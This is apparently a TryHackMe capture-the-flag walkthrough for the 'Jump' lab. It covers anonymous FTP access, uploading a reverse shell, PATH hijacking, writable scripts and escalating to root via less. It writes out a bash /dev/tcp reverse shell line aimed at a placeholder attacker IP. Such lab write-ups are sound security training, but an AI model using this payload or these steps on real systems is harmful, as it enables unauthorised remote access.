![](/home/kali/.config/marktext/images/76099fdd9ef5ca3b0798e9937cce75c00fc2de82.png)

![](assets/b347474a791debfa642959a6474e5f3de3c7dcbf.png)

# THM– Jump Walkthrough

In this walkthrough, I will demonstrate how to solve the Jump machine on Try Hack Me.

The main objective of this room is to gain initial access to the target machine, escalate privileges from a normal user to root, and understand the techniques used throughout the process.

The room focuses on privilege escalation and requires us to investigate the system carefully to identify potential weaknesses.

Let's get started!

________________________________________________________________________________________

first of we need to see which services are available,to gather some info about

we used Nmap:

`nmap -T4 -Pn Lab-IP`

![](assets/fa3d4c2963c5720918a9a4cd5a84d9da9cf2c059.png)

and we found 2 available services the FTP(File Transfare Protocol) and ssh (secure shell)

it's a good start, one of most ftp missconfig is the anonymous login let's check it:

![](assets/316fae0b035be3146b43faad0e8a3e88de71723c.png)

incrediable now let's see what we can find here.

okay we found 2 dir "incoming" and "pub"

![](assets/4c48362beb9d3729a412f69f40645eb09c632e83.png)

incoming an empty dir, but in pub we found a "README.txt" and another 2 empty dirs

![](assets/1c78b65476376da328cbb76fa8bc906b6657c760.png)

then we used mget * to get  the file

![](assets/f7d2cc40fde70718c1a888dbb12b918f23dc2595.png)

finalllyy a lead, an interesting message inside "README.txt"

![](assets/908dcbcb9da410e84dfe95d30bdc3b3024f2fa0d.png)

it says that any file in incoming dir it will be processed automatically so here i ve got an idea, let's make a reverseshell and recieve a connection...:

![](assets/cf71a63551d9e799996571a262e9844aaf570cff.png)

now after we made the reverse shell lets upload it to the "**incoming**" dir

![](assets/df62d2c281f8c0e75503e7e3564cb9d1585a3231.png)

listtining for the connection

![](assets/dbd5abde98be9df1a678927d15b9151beb5efc4d.png)

and after a very short while, we got the connection

and the first flag, 4 to go

![](assets/e62a0db2738b1df6fc18c73448ed7499f77bba13.png)

okay now we start to escalate our prvlg

![](assets/db0108e6184564f72d1220b4e6f6dea474da2f87.png)

the next flag is in the dev_user home dir  but  first we need to take his prvlg lets to save ur time i searched for **suid** and i used **linpeas.sh**

let's use pspy:

this tool will check for process that works in the bakcground ,it doesn't take a snapshoot, it use real time cheacking,u can download it from here :

https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s

okay now after downloading it we have to transfare it to the lab machine 
u can use anyway u want, but ill used python server  and wget to grap the file to the lab machine

after runinng it that is the result :

![](assets/dc25cf6e27a600d38159bd8b95391eabc0f4d739.png)

there is a lot we can check but first, we know that dev_user is 1002 according to the  id command result so let's start with it and see what we can do and our permissions on it

![](assets/2d0ead96fb23f68bd4b6f79f423dc7dde241c484.png)

![](assets/1384432cb136b6fb55b114abfdcc650d92a51b00.png)

niceee, we can write on it, let's add this payload(reverssshellll)

`bash -i >& /dev/tcp/ATTACKER-IP/3090 0>&1'`

![](assets/54eafab00a1fb471ea12c29f65eecbf6b7938ea1.png)

okay now lets start our listtener at the same port we specf .

![](assets/d59646f51be0d1048dbfb6fe93bd4d9b8bf90924.png)

another flag captured, three left

now the third  flag found in the monitor_user’s home directory.

let's keep up the hard work.

we said earlier we gonna check for the other process work in the bg

let's check for 

CMD: UID=1003  PID=3970   | /bin/bash /usr/local/bin/healthcheck

![](assets/0eda6672e4302ac8204b0a306cf4023f2caa067d.png)

okay we can see that the service healthcheck runs the ps command without specifying its full path

what does that mean,,,,,of course path hijacking



actually here i did it in two ways first one :

![](assets/e2745c5885d93b674a1d6830625b5b6e8b343564.png)

and the second one was from the hint Create a new binary at /opt/dev/bin/ps:

![](assets/e00c65df9ee2672c27b8326fb644aa9201058bec.png)

at the end we reached our goal, and u can use whatever u want.

![](assets/d5ec65f80f1758c9d3b38fa5d3332dac5685289f.png)

now after reaching our third flag and third user(monitor_user)

let's see what we can do with this account

![](assets/0fa48020daab6d22793595050e114b2b9da17556.png)

okay first i found this bash file then printed it we can see that it calls another bash file , i searched for the full path of the .sh file  then saw the permissions we can write on it the idea hear to write to it  the same payload as each time then run it as 

**ops_user**





![](assets/c92f0571c349f92c0ae009b0bfa5f9d35ff981af.png)

![](assets/2fdccdf39a95ec28038e33177134f52a9aeb4318.png)

and the FINNAAALLLYY THE BIGBOSS::)) the easiest one!!

we found less

The `less` command in Linux is used to **view the contents of a file one page at a time** without modifying it.

of course there is another way we can use one of them using 
[less | GTFOBins](https://gtfobins.org/gtfobins/less/)

but that what did i do

![](assets/a0cddda70b3a0e38e66a2d23431a84cc0a5304df.png)

# Conclusion

And that's it! We finally managed to compromise the Jump machine and capture all the flags.

This machine was a great opportunity to practice different Linux privilege escalation techniques, starting with FTP misconfigurations and automated file processing, moving through writable scripts and PATH Hijacking, and finally abusing a misconfigured `less` permission to obtain root access.

What made this machine interesting wasn't just getting the flags, but understanding how small misconfigurations can lead to a complete system compromise.

A special lesson from this machine: **Always investigate what runs in the background, check file permissions carefully, and never underestimate seemingly harmless commands.**

I hope you enjoyed this walkthrough and learned something useful along the way.

Thanks for reading, and see you in the next walkthrough!

**Happy Hacking! 🚩**

**Small Note:** I apologize for any spelling or grammatical mistakes throughout this walkthrough. I'm still improving my technical writing, and I appreciate your understanding. Any feedback or corrections are always welcome!
